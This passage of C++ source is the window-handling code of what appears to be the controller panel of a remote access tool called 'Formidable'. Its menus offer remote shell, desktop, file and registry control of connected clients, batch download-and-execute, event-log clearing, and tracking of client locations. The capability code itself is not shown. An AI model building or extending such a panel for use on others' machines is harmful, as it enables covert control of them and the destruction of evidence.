        int logHeight = 150;
        int margin = 8;
        int remainHeight = height - toolbarHeight - statusHeight - tabHeight - margin * 4;
        
        MoveWindow(g_hToolbar, 0, 0, width, toolbarHeight, TRUE);
        int contentTop = toolbarHeight + margin;
        int listWidth = width - margin * 2;
        int clientHeight = remainHeight - logHeight;
        if (clientHeight < 0) clientHeight = 0;
        MoveWindow(g_hListClients, margin, contentTop, listWidth, clientHeight, TRUE);
        MoveWindow(g_hGroupTab, margin, contentTop + clientHeight + margin, listWidth, tabHeight, TRUE);
        MoveWindow(g_hListLogs, margin, contentTop + clientHeight + margin + tabHeight + margin, listWidth, logHeight, TRUE);
        SendMessage(g_hStatusBar, WM_SIZE, 0, 0);
        break;
    }
    case WM_COMMAND: {
        HandleCommand(hWnd, LOWORD(wParam));
        break;
    }
    case WM_NOTIFY: {
        LPNMHDR nm = (LPNMHDR)lParam;

        if (nm->idFrom == IDC_TOOLBAR) {
            if (nm->code == TBN_HOTITEMCHANGE) {
                NMTBHOTITEM* hot = (NMTBHOTITEM*)lParam;
                s_toolbarHotId = hot->idNew;
                InvalidateRect(g_hToolbar, NULL, TRUE);
                return 0;
            }
            if (nm->code == NM_CUSTOMDRAW) {
                return HandleToolbarCustomDraw(g_hToolbar, (NMTBCUSTOMDRAW*)lParam);
            }
        }
        
        // 处理Tab控件通知
        if (nm->idFrom == IDC_GROUP_TAB) {
            if (nm->code == TCN_SELCHANGE) {
                // Tab切换事件
                int nSel = TabCtrl_GetCurSel(g_hGroupTab);
                wchar_t szText[256] = { 0 };
                TCITEMW item = { 0 };
                item.mask = TCIF_TEXT;
                item.pszText = szText;
                item.cchTextMax = 256;
                
                if (TabCtrl_GetItem(g_hGroupTab, nSel, &item)) {
                    g_selectedGroup = WideToUTF8(szText);
                    LoadListData(g_selectedGroup);
                }
            } else if (nm->code == NM_CUSTOMDRAW) {
                return HandleTabCustomDraw(g_hGroupTab, (NMCUSTOMDRAW*)lParam);
            } else if (nm->code == NM_RCLICK) {
                // Tab右键菜单
                POINT pt;
                GetCursorPos(&pt);
                POINT ptClient = pt;
                ScreenToClient(g_hGroupTab, &ptClient);
                
                TCHITTESTINFO htinfo = { 0 };
                htinfo.pt = ptClient;
                int nTab = TabCtrl_HitTest(g_hGroupTab, &htinfo);
                
                if (nTab != -1) {
                    TabCtrl_SetCurSel(g_hGroupTab, nTab);
                    
                    wchar_t szText[256] = { 0 };
                    TCITEMW item = { 0 };
                    item.mask = TCIF_TEXT;
                    item.pszText = szText;
                    item.cchTextMax = 256;
                    TabCtrl_GetItem(g_hGroupTab, nTab, &item);
                    
                    bool isDefault = (wcscmp(szText, L"默认") == 0 || wcscmp(szText, L"default") == 0);
                    
                    if (!isDefault) {
                        HMENU hMenu = CreatePopupMenu();
                        AppendMenuW(hMenu, MF_STRING, IDM_GROUP_RENAME, L"重命名分组");
                        AppendMenuW(hMenu, MF_STRING, IDM_GROUP_DELETE, L"删除分组");
                        TrackPopupMenu(hMenu, TPM_RIGHTBUTTON, pt.x, pt.y, 0, hWnd, NULL);
                        DestroyMenu(hMenu);
                    }
                }
            }
        }
        
        if (nm->idFrom == IDC_LIST_CLIENTS) {
            if (nm->code == NM_RCLICK) {
                // 客户端列表右键菜单
                POINT pt;
                GetCursorPos(&pt);
                
                int selectedCount = ListView_GetSelectedCount(g_hListClients);
                bool hasSel = (selectedCount > 0);
                bool isMulti = (selectedCount > 1);
                
                HMENU hMenu = CreatePopupMenu();
                HMENU hControlMenu = CreatePopupMenu();
                HMENU hBatchMenu = CreatePopupMenu();
                
                // 功能子菜单
                AppendMenuW(hControlMenu, MF_STRING | (!hasSel ? MF_GRAYED : 0), IDM_TERMINAL, L"远程终端(&T)");
                AppendMenuW(hControlMenu, MF_STRING | (!hasSel ? MF_GRAYED : 0), IDM_PROCESS, L"进程管理(&P)");
                AppendMenuW(hControlMenu, MF_STRING | (!hasSel ? MF_GRAYED : 0), IDM_WINDOW, L"窗口管理(&W)");
                AppendMenuW(hControlMenu, MF_STRING | (!hasSel ? MF_GRAYED : 0), IDM_DESKTOP, L"远程桌面(&D)");
                AppendMenuW(hControlMenu, MF_STRING | (!hasSel ? MF_GRAYED : 0), IDM_CLIENT_DESKTOP_GRAYSCALE, L"远程桌面 (灰度)(&G)");
                AppendMenuW(hControlMenu, MF_STRING | (!hasSel ? MF_GRAYED : 0), IDM_FILE, L"文件管理(&F)");
                AppendMenuW(hControlMenu, MF_STRING | (!hasSel ? MF_GRAYED : 0), IDM_SERVICE, L"服务管理(&S)");
                AppendMenuW(hControlMenu, MF_STRING | (!hasSel ? MF_GRAYED : 0), IDM_REGISTRY, L"注册表(&R)");
                
                // 批量操作子菜单
                AppendMenuW(hBatchMenu, MF_STRING | (!isMulti ? MF_GRAYED : 0), IDM_CLIENT_MESSAGE, L"发送消息(&M)");
                AppendMenuW(hBatchMenu, MF_STRING | (!isMulti ? MF_GRAYED : 0), IDM_CLIENT_DOWNLOAD_EXEC, L"下载执行(&D)");
                AppendMenuW(hBatchMenu, MF_STRING | (!isMulti ? MF_GRAYED : 0), IDM_CLIENT_UPLOAD_EXEC, L"上传执行(&U)");
                AppendMenuW(hBatchMenu, MF_STRING | (!isMulti ? MF_GRAYED : 0), IDM_CLIENT_OPEN_URL, L"打开网址(&O)");
                AppendMenuW(hBatchMenu, MF_SEPARATOR, 0, NULL);
                AppendMenuW(hBatchMenu, MF_STRING | (!isMulti ? MF_GRAYED : 0), IDM_CLIENT_SHUTDOWN, L"关机(&S)");
                AppendMenuW(hBatchMenu, MF_STRING | (!isMulti ? MF_GRAYED : 0), IDM_CLIENT_REBOOT, L"重启(&R)");
                AppendMenuW(hBatchMenu, MF_STRING | (!isMulti ? MF_GRAYED : 0), IDM_CLIENT_LOGOUT, L"注销(&L)");
                AppendMenuW(hBatchMenu, MF_SEPARATOR, 0, NULL);
                AppendMenuW(hBatchMenu, MF_STRING | (!isMulti ? MF_GRAYED : 0), IDM_CLIENT_UNINSTALL, L"卸载客户端(&X)");
                AppendMenuW(hBatchMenu, MF_STRING | (!isMulti ? MF_GRAYED : 0), IDM_CLIENT_DISCONNECT, L"断开连接(&C)");
                
                // 主菜单
                AppendMenuW(hMenu, MF_POPUP, (UINT_PTR)hControlMenu, L"功能(&F)");
                AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
                AppendMenuW(hMenu, MF_STRING | (!hasSel ? MF_GRAYED : 0), IDM_CLIENT_REMARK, L"设置备注(&N)");
                AppendMenuW(hMenu, MF_STRING | (!hasSel ? MF_GRAYED : 0), IDM_CLIENT_GROUP, L"设置分组(&G)");
                AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
                if (isMulti) {
                    AppendMenuW(hMenu, MF_POPUP, (UINT_PTR)hBatchMenu, L"批量操作(&B)");
                } else {
                    AppendMenuW(hMenu, MF_STRING | (!hasSel ? MF_GRAYED : 0), IDM_CLIENT_MESSAGE, L"发送消息(&M)");
                    AppendMenuW(hMenu, MF_STRING | (!hasSel ? MF_GRAYED : 0), IDM_CLIENT_DOWNLOAD_EXEC, L"下载执行(&D)");
                    AppendMenuW(hMenu, MF_STRING | (!hasSel ? MF_GRAYED : 0), IDM_CLIENT_UPLOAD_EXEC, L"上传执行(&U)");
                    AppendMenuW(hMenu, MF_STRING | (!hasSel ? MF_GRAYED : 0), IDM_CLIENT_OPEN_URL, L"打开网址(&O)");
                    AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
                    AppendMenuW(hMenu, MF_STRING | (!hasSel ? MF_GRAYED : 0), IDM_CLIENT_SHUTDOWN, L"关机(&S)");
                    AppendMenuW(hMenu, MF_STRING | (!hasSel ? MF_GRAYED : 0), IDM_CLIENT_REBOOT, L"重启(&R)");
                    AppendMenuW(hMenu, MF_STRING | (!hasSel ? MF_GRAYED : 0), IDM_CLIENT_LOGOUT, L"注销(&L)");
                    AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
                    AppendMenuW(hMenu, MF_STRING | (!hasSel ? MF_GRAYED : 0), IDM_CLIENT_CLEAR_EVENT, L"清除日志(&E)");
                    AppendMenuW(hMenu, MF_STRING | (!hasSel ? MF_GRAYED : 0), IDM_CLIENT_UPDATE, L"更新客户端(&U)");
                    AppendMenuW(hMenu, MF_STRING | (!hasSel ? MF_GRAYED : 0), IDM_CLIENT_UNINSTALL, L"卸载客户端(&X)");
                    AppendMenuW(hMenu, MF_STRING | (!hasSel ? MF_GRAYED : 0), IDM_CLIENT_DISCONNECT, L"断开连接(&C)");
                }
                AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
                AppendMenuW(hMenu, MF_STRING, IDM_CLIENT_REFRESH, L"刷新列表(&F5)");
                
                TrackPopupMenu(hMenu, TPM_RIGHTBUTTON, pt.x, pt.y, 0, hWnd, NULL);
                DestroyMenu(hMenu);
            } else if (nm->code == LVN_COLUMNCLICK) {
                LPNMLISTVIEW pnmlv = (LPNMLISTVIEW)lParam;
                HWND hList = g_hListClients;
                
                if (!g_SortInfo.count(hList)) {
                    g_SortInfo[hList] = { pnmlv->iSubItem, true, hList };
                }
                
                if (g_SortInfo[hList].column == pnmlv->iSubItem) {
                    g_SortInfo[hList].ascending = !g_SortInfo[hList].ascending;
                } else {
                    g_SortInfo[hList].column = pnmlv->iSubItem;
                    g_SortInfo[hList].ascending = true;
                }
                
                ListView_SortItems(hList, ListViewCompareProc, (LPARAM)&g_SortInfo[hList]);
                
                {
                    std::lock_guard<std::mutex> lock(g_ClientsMutex);
                    int count = ListView_GetItemCount(hList);
                    for (int i = 0; i < count; i++) {
                        LVITEMW lvi = { 0 };
                        lvi.mask = LVIF_PARAM;
                        lvi.iItem = i;
                        if (ListView_GetItem(hList, &lvi)) {
                            uint32_t cid = (uint32_t)lvi.lParam;
                            if (g_Clients.count(cid)) {
                                g_Clients[cid]->listIndex = i;
                            }
                        }
                    }
                }
            } else if (nm->code == NM_DBLCLK) {
                LPNMITEMACTIVATE lpnmitem = (LPNMITEMACTIVATE)lParam;
                if (lpnmitem->iItem != -1) {
                    LVITEMW lvi = { 0 };
                    lvi.mask = LVIF_PARAM;
                    lvi.iItem = lpnmitem->iItem;
                    if (ListView_GetItem(g_hListClients, &lvi)) {
                        uint32_t clientId = (uint32_t)lvi.lParam;
                        
                        std::shared_ptr<Formidable::ConnectedClient> client;
                        {
                            std::lock_guard<std::mutex> lock(g_ClientsMutex);
                            if (g_Clients.count(clientId)) client = g_Clients[clientId];
                        }
                        
                        if (client) {
                            std::wstring wPath = Utils::StringHelper::UTF8ToWide(client->info.programPath);
                            std::wstring wOS = Utils::StringHelper::UTF8ToWide(client->info.osVersion);
                            std::wstring wUser = Utils::StringHelper::UTF8ToWide(client->info.userName);
                            std::wstring wInstall = Utils::StringHelper::UTF8ToWide(client->info.installTime);
                            std::wstring wUptime = Utils::StringHelper::UTF8ToWide(client->info.uptime);
                            std::wstring wCPU = Utils::StringHelper::UTF8ToWide(client->info.cpuInfo);
                            
                            wchar_t szDetail[2048];
                            swprintf_s(szDetail, 
                                L"文件路径: %s\n"
                                L"进程 PID: %u\n"
                                L"系统信息: %s %s\n"
                                L"启动信息: %s %s[%s] %s\n"
                                L"上线信息: TCP %d\n"
                                L"客户信息: %llu",
                                wPath.c_str(),
                                client->info.processID,
                                wOS.c_str(), wCPU.c_str(),
                                wInstall.c_str(), wUser.c_str(), client->info.isAdmin ? L"管理员" : L"用户", wUptime.c_str(),
                                client->port,
                                client->info.clientUniqueId
                            );
                            
                            MessageBoxW(hWnd, szDetail, L"详细信息", MB_OK | MB_ICONINFORMATION);
                        }
                    }
                }
            }
        }
        break;
    }
    case WM_TRAYICON: {
        if (lParam == WM_LBUTTONDBLCLK) {
            ShowWindow(hWnd, SW_RESTORE);
            SetForegroundWindow(hWnd);
        } else if (lParam == WM_RBUTTONUP) {
            POINT pt;
            GetCursorPos(&pt);
            HMENU hMenu = CreatePopupMenu();
            AppendMenuW(hMenu, MF_STRING, IDM_TRAY_STARTUP, L"开机自启");
            AppendMenuW(hMenu, MF_STRING, IDM_TRAY_RESTART, L"重启服务");
            AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
            AppendMenuW(hMenu, MF_STRING, IDM_TRAY_EXIT, L"退出");
            SetForegroundWindow(hWnd);
            TrackPopupMenu(hMenu, TPM_RIGHTBUTTON | TPM_BOTTOMALIGN, pt.x, pt.y, 0, hWnd, NULL);
            DestroyMenu(hMenu);
        }
        break;
    }
    case WM_LOC_UPDATE: {
        struct UpdateData { uint32_t id; std::wstring loc; int index; };
        UpdateData* data = (UpdateData*)lParam;
        if (data) {
            LVFINDINFOW fi = { 0 };
            fi.flags = LVFI_PARAM;
            fi.lParam = (LPARAM)data->id;
            int index = ListView_FindItem(g_hListClients, -1, &fi);
            if (index >= 0) {
                LVITEMW lvi = { 0 };
                lvi.iSubItem = 2;
                lvi.pszText = (LPWSTR)data->loc.c_str();
                SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lvi);
            }

            {
                std::shared_ptr<Formidable::ConnectedClient> client;
                {
                    std::lock_guard<std::mutex> lock(g_ClientsMutex);
                    if (g_Clients.count(data->id)) client = g_Clients[data->id];
                }
                if (client) {
                    client->location = data->loc; // 保存到内存结构中
                    std::wstring computerName = Utils::StringHelper::UTF8ToWide(client->info.computerName);
                    std::wstring userName = Utils::StringHelper::UTF8ToWide(client->info.userName);
                    std::wstring uniqueKey = computerName + L"_" + userName;
                    if (!uniqueKey.empty()) {
                        std::lock_guard<std::mutex> lockHist(g_HistoryHostsMutex);
                        if (g_HistoryHosts.count(uniqueKey)) {
                            g_HistoryHosts[uniqueKey].location = data->loc;
                        }
                    }
                }
            }
            delete data;
        }
        break;
    }
    case WM_TIMER:
        if (wParam == 1) {
            UpdateStatusBar();
        }
        break;
    case WM_DESTROY:
        KillTimer(hWnd, 1);
        if (g_hTermFont) DeleteObject(g_hTermFont);
        if (g_hTermEditBkBrush) DeleteObject(g_hTermEditBkBrush);
        ReleaseModernTheme();
        RemoveTrayIcon(hWnd);
        SaveSettings();
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProcW(hWnd, message, wParam, lParam);
    }
    return 0;
}
